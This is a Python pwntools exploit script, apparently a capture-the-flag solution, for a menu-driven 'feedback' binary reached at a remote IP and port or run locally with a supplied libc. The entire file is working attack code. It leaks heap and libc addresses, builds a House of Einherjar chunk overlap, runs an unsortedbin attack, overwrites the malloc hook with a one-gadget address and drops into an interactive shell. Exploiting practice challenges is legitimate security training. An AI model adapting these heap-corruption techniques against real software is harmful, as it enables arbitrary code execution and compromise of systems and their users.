from pwn import *
import sys

HOST='18.224.70.88'
PORT=1337

if len(sys.argv)>1:
    r=remote(HOST,PORT)
else:
    r=process('./feedback',env={"LD_PRELOAD":"./libc.so"})

libc=ELF("./libc.so")

def menu(opt):
    r.sendlineafter("Enter choice >> ",str(opt))

def leave_name(name,line=True):
    menu(1)
    if line:
        r.sendlineafter("Enter Name: ",name)
    else:
        r.sendafter("Enter Name: ",name)

def add_draft(title,size,feedback,line=True):
    menu(2)
    if line:
        r.sendlineafter("Enter draft title: ",title)
    else:
        r.sendafter("Enter draft title: ",title)
    r.sendlineafter("Enter size of draft: ",str(size))
    r.sendlineafter("Give your feedback: ",feedback)

def view():
    menu(3)

def create():
    menu(4)

def save():

    ''' libc leak + unsortedbin attack '''

    menu(5)
    r.sendlineafter("Enter draft id to save: ",'1')
    r.sendafter("Enter Team Name and Details: ","A"*0x350)
    r.recvuntil("Team: "+("A"*350))
    libc.address=u64(r.recvuntil('\n').strip().replace("A",'').ljust(8,'\x00'))-0x3c4b78#-0x3c1b58
    log.info("libc @ "+hex(libc.address))
    r.sendlineafter("Confirm? <y/n>: ",'n')
    r.sendafter("Enter Team Name and Details: ","A"*0x340+p64(0)+p64(0x51))
    r.sendlineafter("Confirm? <y/n>: ",'y')
    r.sendlineafter("Now give us your contact details: ",p64(0)+p64(libc.address+0x3c4910))


def terminate():

    ''' overwrite malloc hook '''
	
    #log.info("Onto terminate()")	

    r.recvuntil("Enter this captcha code: ")
    captcha=r.recvuntil('\n').strip()
    r.sendline(captcha+'\x00'+p64(libc.address+0x3c6790)+p64(-1,signed=True)+p64(0)+p64(libc.address+0x3c49c0)+p64(0)*6+p64(libc.address+0x3c36e0)+"A"*0x150+p64(libc.address+0xf0274))


def getleak():

    ''' Heap Leak '''

    add_draft("A"*32,-1,"AA",line=False)
    view()
    r.recvuntil("Title: "+"A"*32)
    r.recv(8)
    heap=u64(r.recvuntil('\n').strip().ljust(8,'\x00'))-0x10
    log.info("heap @ "+hex(heap))

    ''' House of Einherjar '''

    add_draft("A",0x3c8,"B"*0x340+p64(0)+p64(0x1a1)+p64(heap+0x860)*4)
    add_draft("A",0x80,"A")
    leave_name("A")
    create()
    add_draft("A",0x100,p64(0x21)*20)
    leave_name("A"*128+p64(0x1a0)+'\x30',line=False)
    #log.info("Leaving leak()")
    #gdb.attach(r,'''b*0x000000000040100c\nb*0x000000000040100c\nb*0x000000000040105a\nb*0x0000000000401093''')

    save()

    terminate()




if __name__=='__main__':

    getleak()
    r.interactive()
